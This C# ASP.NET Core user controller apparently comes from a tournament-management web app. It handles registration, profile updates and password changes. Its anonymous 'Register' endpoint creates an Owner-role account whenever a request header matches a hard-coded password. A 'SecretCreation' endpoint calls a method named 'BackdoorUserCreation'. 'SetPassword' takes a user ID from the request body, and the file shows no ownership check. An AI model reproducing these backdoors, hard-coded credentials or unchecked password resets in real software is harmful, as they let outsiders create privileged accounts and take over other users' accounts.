using System;
using System.Net;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging;
using TRNMNT.Core.Helpers.Exceptions;
using TRNMNT.Core.Model.User;
using TRNMNT.Core.Services.Interface;
using TRNMNT.Data.Context;

namespace TRNMNT.Web.Controllers
{
    [Route("api/[controller]")]
    public class UserController : BaseController
    {
        private readonly IUserService _userService;
        #region .ctor

        public UserController(ILogger<UserController> logger, IUserService userService, IEventService eventService, IAppDbContext context, IConfiguration configuration) : base(logger, userService, eventService, context, configuration)
        {
            _userService = userService;
        }

        #endregion

        #region Public Methods

        [HttpPost("[action]")]
        public async Task<IActionResult> SecretCreation([FromBody] SecretUserCreationModel secretUserCreationModel)
        {
            try
            {
                if (secretUserCreationModel == null || !ModelState.IsValid)
                {
                    throw new Exception("Invalid user creation model.");
                }
                await UserService.BackdoorUserCreation(secretUserCreationModel);
                await Context.SaveAsync();
                return Ok();
            }
            catch (Exception e)
            {
                HandleException(e);
                return NotFound();
            }
        }

        [AllowAnonymous, HttpPost("[action]")]
        public async Task<IActionResult> Register([FromBody] UserRegistrationModel model)
        {
            return await HandleRequestAsync(async() =>
            {
                if (Request.Headers["password"] == "pizdecpassword")
                {
                    await _userService.CreateUserAsync(model, "Owner");
                    return HttpStatusCode.OK;
                }
                else
                {
                    return HttpStatusCode.Forbidden;;
                }
            });
        }

        [AllowAnonymous, HttpPost("[action]")]
        public async Task<IActionResult> RegisterParticipantUser([FromBody] UserRegistrationModel model)
        {
            return await HandleRequestAsync(async() =>
            {
                var result = await _userService.CreateParticipantUserAsync(model);
                if (!result.Success)
                {
                    throw new BusinessException(result.Reason);
                }
                return HttpStatusCode.OK;
            });
        }

        [Authorize, HttpPost("[action]")]
        public async Task<IActionResult> UpdateProfile([FromBody] UserModel model)
        {
            return await HandleRequestAsync(async() =>
            {
                await _userService.UpdateUserAsync(model);
            });
        }

        [Authorize, HttpPost("[action]")]
        public async Task<IActionResult> ChangePassword([FromBody] ChangePasswordModel model)
        {
            return await HandleRequestAsync(async() =>
            {
                await _userService.ChangesPasswordAsync(model.OldPassword, model.NewPassword, model.UserId);
            });
        }

        [Authorize, HttpPost("[action]")]
        public async Task<IActionResult> SetPassword([FromBody] ChangePasswordModel model)
        {
            return await HandleRequestAsync(async() =>
            {
                await _userService.SetPasswordAsync(model.NewPassword, model.UserId);
            });
        }
        #endregion
    }
}